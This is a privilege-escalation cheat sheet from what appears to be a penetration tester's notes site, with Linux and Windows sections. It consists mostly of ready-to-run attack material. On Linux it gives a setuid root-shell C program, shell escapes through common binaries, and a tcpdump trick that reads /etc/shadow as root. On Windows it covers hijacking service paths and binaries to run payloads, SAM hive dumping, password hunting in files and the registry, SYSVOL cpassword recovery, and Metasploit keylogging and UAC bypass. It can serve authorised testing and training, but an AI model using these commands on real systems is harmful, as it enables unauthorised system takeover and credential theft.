---
title: Priv Esc
category: Post-Exploitation
order: 96
---

>**Linux**

check sudo permissions | <code> sudo -l </code>
check for world writable files | <code> find / -perm -2 ! -tyle l -ls 2>/dev/null </code>
Cron.d | Write a file to cron.d and wait for restart
Cron files | <code> ls /etc/cron.hourly/ <br> #can you write to any files </code>
Kernal Exploit | <code>Run uname -a, /etc/release, /etc/issue, /proc/version and find an exploit (searchsploit or linprivchecker.py) </code>
Application Exploit | Look for web servers, mail servers for command injection <br> Look for exploits in root owned programs
PATH | Look for '.' in the path for system users
SETUID/SETGUID | <code> find directory -user root -perm -4000 -exec ls -ld {} \; > /tmp/security-hole <br> find / -perm -u=s -type f 2>/dev/null <br> find / -perm -g=s -type f 2>/dev/null </code> <br> They may use the system syscall without specifying the path name 
User writable scripts | Look for scripts that have user writable permissions and are invoked by root (or call scripts that are invoked by root)
Enlightenment Exploit Pack | tbd
LD_PRELOAD | [SANS](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win)
Processes Running as Root | <code> ps aux - look for things that execute commands like a db </code>
Mail | <code> /var/spool/mail </code>
Unmounted file system | <code> mountâ€ˆ-l <br> cat /etc/fstab </code>

**Cronjob**

Find files with week permisions
{% highlight bash %}
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
{% endhighlight %}

**Set UID Binary**
{% highlight C %}
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}

{% endhighlight %}

Resources:
* [g0tmilk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [LinEnum](http://www.rebootuser.com/?p=1758)
* [LinuxPrivChecker](http://www.securitysift.com/download/linuxprivchecker.py)


**setuid permissions**
 
{% highlight bash %}

vi:
:shell
:set shell=/bin/bash
:! /bin/bash

less:
(press v - launching vi) :shell

more:
?,  !bash

more,less, man:
'! /bin/sh'
'!/bin/sh'
'!bash'

tee:
echo "evil script code" | tee script.sh

awk:
awk 'BEGIN {system("/bin/sh")}'

find . -exec bash -i \;
find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

perl exec ""/bin/bash"";[ctrl-d]
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";

ruby exec ""bin/bash""
ruby: exec "/bin/sh"

python import os os.system('/in/bash')
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()

lua: os.execute('/bin/sh')

irb(main:001:0> exec "/bin/sh"

tcpdump:
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

nano, cp, ht, mv (overwrite /etc/shadow or high priv script)

{% endhighlight %}

>**Windows**

Internal Services | <code> netstat -ano //look for local (127.0.0.1) services and use a port forward </code> 
Find Unquoted Service Paths | <code> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v "" </code>
Exploit Unquoted Service Paths | <code> Upload your exploit as C:\Program.exe, C:\Program Files.exe... as applicable with spaces </code>
Insecure Service Registry Permissions - Find Services | <code> REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ /se #. </code>
Insecure Service Registry Permissions- Check Permissions | <code> Download SubInACL (see resources), install it on a windows machine, extract the C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe, and download it to the victim </code>
Insecure Service Registry Permissions- Check Permissions | <code> subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display #Pay attention to pace</code>
Insecure Service Registry Permissions- Exploit Weak Permissions |<code> reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f </code>
Find SMB Version 1 | <code> Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} </code>
Find SMB Version 2/3 | <code> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} </code>
Find SMB Version 2/3 | <code> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} </code>
Check installed patches | wmic qfe list full /format:list 
Check Services | <code> wmic service get name,startname,pathname </code>
MSF Services | <code> use exploit/windows/local/service_permisssions </code>
Check Services - wmic icacls| <code> for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt <br> for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" </code>
Check Services - sc 1 | <code> Find a privileged service that your can overwrigth the binary <br> for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j  </code>
Check Services - sc 2 | <code> sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt <br> FOR /F %i in (Servicenames.txt) DO echo %i <br> type Servicenames.txt <br> FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt <br> FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt <br> cacls "C:\path\to\file.exe"  </code> 
Check Services 2 | <code> Look for unprivileged access to services: <br> accesschk.exe -uwcqv "Authenticated Users" * <br> accesschk.exe -ucqv upnphost  </code>
Exploit Services 2 | <code> sc qc upnphost <br> sc config upnphost binpath= "payload.exe" <br> sc config upnphost obj= ".\LocalSystem" password= "" <br> sc qc upnphost <br> net start upnphost </code>
Check Scheduled Tasks | <code> Find a privileged scheduled task that your can overwrigth the binary <br> schtasks /query /fo list /v </code>
Check Startup | <code> Find a privileged scheduled task that your can overwrigth the binary <br> wmic startup list full </code>
Check Permissions on Services, Tasks, and Startup |  <code> icacls executable <br> #look for something like Everyone:(CI)(F) or Users:(CI)(F) </code>
Missing Patches | <code> (New-Object -c Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates|Select Title </code>
Metasploit Get Privs | <code> use priv </code>
Metasploit Get System | <code> getsystem -n [number] or migrate [system pid] </code>
Metasploit keylogger | <code> keyscan_start, keyscan_stop, keyscan_dump </code>
Metasploit Bypass UAC | <code> use exploit/windows/local/bypassuac </code>
Hashed Passwords | <code> reg save HKLM\SAM C:\Windows\Temp\SAM </code>
Hashed Passwords | <code> reg save HKLM\SYSTEM SYSTEM </code>
SAM Locations | <code> c:\windows\repair, c:\winnt\repair </code>
Active Directory Representations | ntd.dit
Run a command as another user | <code> C:\> runas /noprofile /user:domain\username "mmc wf.msc" </code>


**DLL hijacking**

Serach order:
You can see the DLL search order on 32-bit systems below:
* The directory from which the application loaded
* 32-bit System directory (C:\Windows\System32)
* 16-bit System directory (C:\Windows\System)
* Windows directory (C:\Windows)
* The current working directory (CWD)
* Directories in the PATH environment variable (system then user)

Find the DLL that the application loads:
https://pentestlab.blog/2017/03/27/dll-hijacking/
http://www.fuzzysecurity.com/tutorials/16.html

**Clear text Passwords**

{% highlight bash %}
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*

#Common Files
wp-config.php -  	WordPress configuration file. Stores database passwords.
key3.db / logins.json - Password file for the Firefox web browser.
*.pst	| Users may email passwords around. These can often be found in .pst files
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
{% endhighlight %}


**Port Forward for local services** 

{% highlight bash %}
# Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101
 
#Netsh web example on port 80 
netsh interface portproxy add v4tov4 listenport=49162 listenaddress=0.0.0.0 connectport=80 connectaddress=10.1.1.223
{% endhighlight %}
 
**Scripts**
* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
* [SessionGopher](https://github.com/fireeye/SessionGopher)
* [JAWS](https://github.com/411Hall/JAWS)
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [Sherlock](https://github.com/rasta-mouse/Sherlock)
* [Windows Privesc Check](https://github.com/silentsignal/wpc-ps)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* Metasploit - Enum Patch (post/windows/gather/enum_patches)
* Metasploit - Exploit Suggester(post/multi/recon/local_exploit_suggester)
* [BeRoot](https://github.com/AlessandroZ/BeRoot)
* [Privesc](https://github.com/enjoiz/Privesc)

**Windows XP 

**Run a command as another user Powershell**

{% highlight bash %}
#create run.ps1
$secpasswd = ConvertTo-SecureString "sup3r53cr3tGP0pa55" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator",
$secpasswd)
$computer = "DEV01"
[System.Diagnostics.Process]::Start("C:\Windows\temp\dabbb118.exe","",
$mycreds.Username, $mycreds.Password, $computer)

#execute run.ps1
powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1
{% endhighlight %}

**Finding Passwords in SYSVOL**

{% highlight bash %}
set (look for LOGONSERVER or USERDNSDOMAIN)
nslookup LOGONSERVER.USERDNSDOMAIN
net use z: \\dc01\SYSVOL
#change to z drive 
dir /s groups.xml, scheduledtasks.xml, Drives.xml, DataSources.xml, Printers.xml, Services.xml, ScheduledTasks.xml 
#Typically \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies
dir /s *.vbs
dir Groups.xml /s
#look for password or cpassword
type [file].xml
#If cpassword is found decrypt with https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
#or gpp-decrpyt in Kali 
{% endhighlight %}

http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin
https://www.slideshare.net/riyazwalikar/windows-privilege-escalation

>**Mind Map**

[Priv Esc Mind Map](https://binaryexile.github.io/images/privesc.jpg)


>**Tools**

* [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)


